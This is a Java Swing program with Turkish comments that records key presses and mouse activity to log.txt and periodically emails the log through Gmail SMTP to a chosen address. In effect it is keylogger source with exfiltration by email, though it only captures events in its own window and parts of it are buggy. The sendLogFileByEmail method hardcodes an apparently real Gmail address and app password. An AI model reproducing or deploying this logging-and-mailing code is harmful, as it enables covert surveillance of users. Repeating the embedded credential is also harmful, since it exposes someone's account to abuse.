import java.io.*;
import java.awt.event.*;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.*;
import javax.swing.BorderFactory;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.border.Border;
import java.awt.Color;
import java.awt.Font;
import java.util.Properties;
import java.util.Timer;
import java.util.TimerTask;
import javax.swing.JButton;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMultipart;



public class Main extends JFrame implements KeyListener, MouseListener, MouseMotionListener {
    private StringBuilder keysTyped;      // Kullanıcı tarafından yazılan tuş kombinasyonlarını depolamak için kullanılır.
    private PrintWriter writer;           // Yazma işlemleri için kullanılır.
    private long startTime;               // Programın başlama zamanını tutmak için kullanılır.
    private JButton startButton;          // Programın başlatılmasını sağlayan düğme.
    private JButton stopButton;           // Programın durdurulmasını sağlayan düğme.
    private JTextField emailField;        // E-posta adresini girmek için kullanılan metin alanı.
    private JTextField timeField;         // Zaman bilgisini göstermek için kullanılan metin alanı.
    private JTextField fileField;         // Dosya adını girmek için kullanılan metin alanı.
    private JCheckBox keyboardCheckBox;   // Klavye girişini etkinleştirme/devre dışı bırakma için kullanılan onay kutusu.
    private JCheckBox mouseCheckBox;      // Fare girişini etkinleştirme/devre dışı bırakma için kullanılan onay kutusu.



    public static long maxFileSize = 1024*1024*1024;
    public static String email;
    public static double sure;
    private boolean loggingStarted;

    public Main() {



        setVisible(true);

        keysTyped = new StringBuilder();
        startTime = 0;
        loggingStarted = false;

        try {
            writer = new PrintWriter(new FileWriter("log.txt", true));
        } catch (IOException e) {
            e.printStackTrace();
        }
        // Panel görüntüsünün ayarlanması
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setTitle("Tuş ve Fare Kaydedici");
        setSize(1200, 500);
        setLocation(150, 160);
        setFocusable(true);
        setLayout(null);
        getContentPane().setBackground(Color.WHITE);
        Border border = BorderFactory.createLineBorder(Color.DARK_GRAY, 4);

        keyboardCheckBox = new JCheckBox("Klavye ");
        keyboardCheckBox.setBounds(900,1,400,50);
        keyboardCheckBox.setFont(new Font("arial",Font.BOLD,26));
        keyboardCheckBox.setBackground(Color.white);
        add(keyboardCheckBox);

        mouseCheckBox = new JCheckBox("Fare ");
        mouseCheckBox.setBounds(900,100,400,50);
        mouseCheckBox.setFont(new Font("arial",Font.BOLD,26));
        mouseCheckBox.setBackground(Color.white);
        add(mouseCheckBox);

        fileField = new JTextField(30);
        JLabel fileLabel = new JLabel("Maksimum Log File Boyutu(MB): ");
        fileLabel.setBorder(border);
        fileLabel.setBounds(1, 200, 430, 50);
        fileLabel.setFont(new Font("Arial", Font.BOLD, 26));
        fileField.setBounds(440, 200, 70, 50);
        fileField.setFont(new Font("Arial", Font.ITALIC, 26));
        add(fileLabel);
        add(fileField);

        JLabel label= new JLabel("*Siz veri girmediğinizde dosya boyutu default 5 mb olarak kabul edilir.");
        label.setBounds(1,250,700,50);
        label.setFont(new Font("Arial",Font.BOLD,11));
        add(label);

        emailField = new JTextField(30);
        JLabel emailLabel = new JLabel("Gönderilecek Mail Hesabı: ");
        emailLabel.setBorder(border);
        emailLabel.setBounds(1, 1, 345, 50);
        emailLabel.setFont(new Font("Arial", Font.BOLD, 26));
        emailField.setBounds(350, 1, 400, 50);
        emailField.setFont(new Font("Arial", Font.ITALIC, 26));
        add(emailLabel);
        add(emailField);

        timeField = new JTextField(30);
        JLabel zamanLabel = new JLabel("Mail Gönderme Aralıkları(dakika): ");
        zamanLabel.setBorder(border);
        zamanLabel.setBounds(1, 100, 435, 50);
        zamanLabel.setFont(new Font("Arial", Font.BOLD, 26));
        timeField.setBounds(440, 100, 70, 50);
        timeField.setFont(new Font("Arial", Font.ITALIC, 26));
        add(zamanLabel);
        add(timeField);

        startButton = new JButton("BAŞLAT");
        startButton.setBounds(200, 300, 200, 100);
        startButton.setFont(new Font("Arial", Font.BOLD, 26));
        startButton.setBackground(Color.DARK_GRAY);
        startButton.setForeground(Color.WHITE);

        startButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                if (!loggingStarted) {
                    startLogging();
                    loggingStarted = true;


                }
            }
        });
        add(startButton);



        stopButton = new JButton("Dur");
        stopButton.setBounds(600, 300, 200, 100);
        stopButton.setFont(new Font("Arial", Font.BOLD, 26));
        stopButton.setBackground(Color.DARK_GRAY);
        stopButton.setForeground(Color.WHITE);
        stopButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                if (loggingStarted) {
                    stopLogging();
                    loggingStarted = false;

                }
            }
        });
        stopButton.setEnabled(false);
        add(stopButton);




        setVisible(true);

    }

    private void startLogging() {
        // Kaydetmeyi başlatan metot



        keysTyped.setLength(0);
        email = emailField.getText();
        sure = Double.parseDouble(timeField.getText()) * 60.0 * 1000.0;





        try {
            maxFileSize = 1024*1024*Integer.parseInt(fileField.getText());
        }
        catch (NumberFormatException e){
            maxFileSize=1024*1024*5;
        }


        try {
            File logFile = new File("log.txt");
            writer = new PrintWriter(new FileWriter(logFile, true), true);


        } catch (IOException e) {
            e.printStackTrace();
        }
        // Kaydetmeyi başlatma işlemleri
        startTime = System.currentTimeMillis();

        startButton.setEnabled(false);
        stopButton.setEnabled(true);

        requestFocus();

        // Klavye verileri için kaydetme kontrolü
        if (keyboardCheckBox.isSelected()) {
            addKeyListener(this);
        }

        // Fare verileri için kaydetme kontrolü
        if (mouseCheckBox.isSelected()) {
            addMouseListener(this);
            addMouseMotionListener(this);
        }






    }
    private void resetLogFile() {
        try {
            writer.close(); // Mevcut dosyayı kapatın
            PrintWriter newWriter = new PrintWriter(new FileWriter("log.txt", false)); // Yeni bir dosya oluşturun
            writer = newWriter; // Yeni PrintWriter'ı kullanın
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void stopLogging() {

        writer.close();

        keysTyped.setLength(0);

        startButton.setEnabled(true);
        stopButton.setEnabled(false);

        // Kaydetme kontrolünü kaldır
        removeMouseListener(this);
        removeMouseMotionListener(this);

    }


    @Override
    public void keyTyped(KeyEvent e) {

    }

    @Override
    public void keyPressed(KeyEvent e) {
        keysTyped.append(e.getKeyChar());

    }

    boolean klavye =true;
    boolean mouse =true;

    @Override
    public void keyReleased(KeyEvent e) {

        String log = "Tuş Basıldı - Tuş Kodu: " + (char) e.getKeyCode() + ", Zaman: " + (System.currentTimeMillis() - startTime) + " ms";
        writer.println(log);
        writer.flush();
        System.out.println(log);


        StringBuilder fileContentBuilder = new StringBuilder();

        String fileContent = fileContentBuilder.toString();



        if(mouse && klavye) {
            Timer timer = new Timer();
            TimerTask task = new TimerTask() {
                @Override
                public void run() {
                    // E-posta gönderme işlemi
                    sendLogFileByEmail(fileContent);
                    System.out.println("Komut çalıştı!");
                }
            };

            // Belirli süre aralıklarında e-posta gönderme işlemini başlatır
            timer.scheduleAtFixedRate(task, 0, (long) (sure ));
            klavye =false; if(klavye ==false){
                mouse =false;
            }



        }



        File logFile = new File("log.txt");
        long fileSize = logFile.length();
        if (fileSize >= maxFileSize) {
            sendLogFileByEmail(fileContent);


            System.out.println("Komut çalıştı!");

            resetLogFile();


        }



    }

    @Override
    public void mouseClicked(MouseEvent e) {

    }

    @Override
    public void mousePressed(MouseEvent e) {
        String log = "Mouse Basıldı - X: " + e.getX() + ", Y: " + e.getY() + ", Zaman: " + (System.currentTimeMillis() - startTime) + " ms";
        writer.println(log);
        writer.flush();
        System.out.println(log);

        StringBuilder fileContentBuilder = new StringBuilder();

        String fileContent = fileContentBuilder.toString();


        if (mouse) {
            Timer timer = new Timer();
            TimerTask task = new TimerTask() {
                @Override
                public void run() {
                    // E-posta gönderme işlemi


                    sendLogFileByEmail(fileContent);

                    System.out.println("Komut çalıştı!");

                }
            };

            // Komutun başlatılmasından itibaren 0 milisaniye bekleyip, ardından her 20 saniyede bir çalışmasını sağlar
            timer.scheduleAtFixedRate(task, 0, (long) sure);
            mouse =false;
        }

        File logFile = new File("log.txt");
        long fileSize = logFile.length();
        if (fileSize >= maxFileSize) {
            sendLogFileByEmail(fileContent);


            System.out.println("Komut çalıştı!");
            resetLogFile();
        }



    }


    @Override
    public void mouseReleased(MouseEvent e) {

    }

    @Override
    public void mouseEntered(MouseEvent e) {

    }

    @Override
    public void mouseExited(MouseEvent e) {

    }

    @Override
    public void mouseDragged(MouseEvent e) {

    }

    @Override
    public void mouseMoved(MouseEvent e) {
        // Mouse hareketi kaydedilir ve log dosyasına yazılır
        String log = "Mouse Hareket Etti - X: " + e.getX() + ", Y: " + e.getY() + ", Zaman: " + (System.currentTimeMillis() - startTime) + " ms";
        writer.println(log);
        writer.flush();
        System.out.println(log);

        StringBuilder fileContentBuilder = new StringBuilder();

        String fileContent = fileContentBuilder.toString();

        File logFile = new File("log.txt");
        long fileSize = logFile.length();
        // Log dosyasının boyutu, maksimum dosya boyutunu aştığında e-posta ile gönderilir

        if (fileSize >= maxFileSize) {
            sendLogFileByEmail(fileContent);// Log dosyasını e-posta ile gönderir


            System.out.println("Komut çalıştı!");


            resetLogFile();// Log dosyasını sıfırlar
        }
    }

    private void sendLogFileByEmail(String fileContent) {
        email = emailField.getText();// E-posta adresini alır
        sure = Integer.parseInt(timeField.getText());// Sure değişkenine kaydetme süresini atar

        String senderEmail = "11ensar33ahmet@gmail.com";// Gönderen e-posta adresi
        String senderPassword = "wivmcmsdotpprrcn";// Gönderen e-posta şifresi
        String recipientEmail = email;// Alıcı e-posta adresi
        String subject = "Log Dosyası Güncellemesi";// E-posta konusu
        String filePath = "log.txt"; // Dosya yolu

        // E-posta gönderme işlemleri için MailSender sınıfını kullanır
        MailSender mailSender = new MailSender(senderEmail, senderPassword, recipientEmail);
        mailSender.sendEmail(subject, filePath);
    }

    public static void main(String[] args) {

        SwingUtilities.invokeLater(() -> {


            Main logger = new Main();




        });



    }

    private static class MailSender {
        private String senderEmail;
        private String senderPassword;
        private String recipientEmail;

        public MailSender(String senderEmail, String senderPassword, String recipientEmail) {
            this.senderEmail = senderEmail;
            this.senderPassword = senderPassword;
            this.recipientEmail = recipientEmail;
        }

        public void sendEmail(String subject, String filePath) {
            // E-posta sunucusu ve portu
            String host = "smtp.gmail.com";
            int port = 587;

            try {
                // E-posta ayarlarının yapılması
                Properties properties = new Properties();
                properties.put("mail.smtp.auth", "true");
                properties.put("mail.smtp.starttls.enable", "true");
                properties.put("mail.smtp.host", host);
                properties.put("mail.smtp.port", port);

                // Kimlik doğrulama bilgileri
                Authenticator auth = new Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(senderEmail, senderPassword);
                    }
                };

                // E-posta oturumu oluşturma
                Session session = Session.getInstance(properties, auth);

                // E-posta oluşturma
                MimeMessage message = new MimeMessage(session);
                message.setFrom(new InternetAddress(senderEmail));
                message.addRecipient(Message.RecipientType.TO, new InternetAddress(recipientEmail));
                message.setSubject(subject);

                // Dosya ekini oluşturma
                MimeBodyPart messageBodyPart = new MimeBodyPart();
                Multipart multipart = new MimeMultipart();
                messageBodyPart.attachFile(filePath);
                multipart.addBodyPart(messageBodyPart);
                message.setContent(multipart);

                // E-postanın gönderilmesi
                try {
                    Transport.send(message);
                } catch (MessagingException e) {
                    throw new RuntimeException(e);
                }

                System.out.println("E-posta gönderildi!");
            } catch (MessagingException | IOException e) {
                e.printStackTrace();
            }
        }

    }

}